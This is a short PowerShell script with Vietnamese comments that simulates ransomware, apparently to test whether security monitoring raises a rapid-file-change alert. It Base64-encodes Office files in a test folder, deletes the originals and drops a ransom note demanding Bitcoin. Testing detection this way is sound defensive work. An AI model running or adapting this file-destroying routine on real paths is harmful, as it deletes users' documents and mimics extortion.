# Mô phỏng hành vi mã hóa - ransomware
# Kỳ vọng: Alert hành vi ransomware (rapid file change).
$path = "C:\syvtit-testing"
$files = Get-ChildItem $path -Recurse -Include *.doc, *.docx, *.xls, *.xlsx

foreach ($file in $files) {
    $content = Get-Content $file.FullName
    $encrypted = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
    $encrypted | Out-File "$($file.FullName).enc"
    Remove-Item $file.FullName
}

# Tạo file đòi tiền chuộc
"All your files have been encrypted. Pay 1 BTC to ..." | Out-File "$path\READ_ME.txt"
